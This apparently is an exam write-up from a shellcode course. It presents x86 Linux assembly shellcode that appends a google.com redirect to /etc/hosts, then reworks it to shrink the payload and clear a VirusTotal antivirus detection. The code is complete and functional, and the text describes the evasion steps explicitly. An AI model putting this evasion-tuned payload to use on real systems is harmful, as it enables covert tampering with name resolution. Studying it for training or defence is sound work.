For the second part of this exam section, I chose a payload from Javier 
Tejedor[^1] whose purpose is to append a new entry to the local /etc/hosts 
file. Here's how it works:

{% highlight nasm %}
global _start
section .text

_start:
    xor ecx, ecx    ; Clear ECX
    mul ecx         ; Also clear EAX and EDX
    mov al, 0x5     ; OPEN
    push ecx        ; Null termination
    push 0x7374736f ; osts
    push 0x682f2f2f ; ///h
    push 0x6374652f ; /etc
    mov ebx, esp    ; Save pointer to file path
    mov cx, 0x401   ; O_APPEND|O_WRONLY 
    int 0x80        ; Exec interrupt

    xchg eax, ebx   ; Save FD to EBX
    push 0x4        ; Load WRITE syscall...
    pop eax         ; ...into EAX
    jmp short _load_data    ; Jump to _load_data

_write:
    pop ecx         ; Pop address of string into ECX
    push 21         ; Length: 21 chars
    pop edx         ; -> EDX
    int 0x80        ; Exec interrupt

    push 0x6        ; Load CLOSE syscall...
    pop eax         ; ...into EAX
    int 0x80        ; Exec interrupt

    push 0x1        ; Load EXIT syscall...
    pop eax         ; ...into EAX
    int 0x80        ; Exec interrupt

_load_data:
    call _write     ; Push address of string onto stack and call _write
    google db "127.1.1.1 google.com"
{% endhighlight %}

This one's a bit more involved than the first exercise: we're opening the
/etc/hosts file using flags `O_APPEND|O_WRONLY`, writing some text to it, 
closing the file, then exiting.  

Out of the box, we're looking at 78 bytes of shellcode and a single red light
on the VirusTotal[^2] dashboard, McAfee-GW-Edition. The author elected to use a
mix of JMP/CALL/POP and stacked-based string declarations. In my testing, I 
found that changing only one of these was sufficient to make VirusTotal happy.

## Initialization and OPEN

{% highlight nasm %}
xor ecx,ecx     ; Clear ECX
mul ecx         ; Also clear EAX and EDX
mov al,0x5      ; OPEN
push ecx        ; Push null termination
push 0x7374736f ; osts
push 0x682f2f2f ; ///h
push 0x6374652f ; /etc
mov ebx,esp     ; Save pointer to file path
mov cx,0x401    ; O_APPEND|O_WRONLY
int 0x80        ; Exec interrupt
{% endhighlight %}

There wasn't really anything to change in this section. With the exception of
the "/etc///hosts" path, there's nothing notable about the calls being made. I
played around with other methods for passing the file path to the OPEN syscall,
but ultimately left it as it was.

## WRITE and EXIT

{% highlight nasm %}
xchg eax,ebx    ; Save FD to EBX        
push 0x4        ; Load WRITE syscall...
pop eax         ; ...into EAX
push 0x6d6f632e ; .com
push 0x656c676f ; ogle
push 0x6f672031 ; 1 go
push 0x2e312e31 ; 1.1.
push 0x2e373231 ; 127.
mov ecx,esp     ; Save argument pointer
mov dl,0x14     ; Length: 20 chars
int 0x80        ; Exec interrupt
{% endhighlight %}


I refactored the JMP/CALL/POP to use the same stack-based method we saw for
the file path argument; this saved a few bytes.  I also made changes to how
the syscall IDs were being loaded in an effort to save a few bytes.
{% highlight nasm %}
mov al,0x6 ; previously push 0x6 / pop eax
int 0x80

inc al     ; previously push 0x1 / pop eax (CLOSE syscall returns 0 on success)
int 0x80        
{% endhighlight %}

Those changes, though minor, were enough to get the green light in 
VirusTotal[^3], and we dropped the payload size from 78 to 73 in the process!
